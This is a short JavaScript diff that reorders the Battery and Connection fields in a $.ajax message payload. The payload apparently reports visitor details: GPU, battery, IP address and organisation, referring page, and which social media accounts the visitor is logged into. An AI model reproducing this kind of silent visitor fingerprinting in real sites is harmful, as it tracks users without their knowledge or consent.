@@ -533,12 +533,12 @@ $.ajax({
                 "value": gpuInfo + "\n",
                 "short": true
             },  {
-                "title": "Battery",
-                "value": batteryInfo + "\n",
-                "short": true
-            }, {
                 "title": "Connection",
                 "value": "IP: " + connectionInfo.ip + "\n" + "ORG: " + connectionInfo.org + "\n" + "Previous Page: " + document.referrer + "\n",
+                "short": true
+            }, {
+                "title": "Battery",
+                "value": batteryInfo + "\n",
                 "short": true
             }, {
                 "title": "Social Media Logged In",
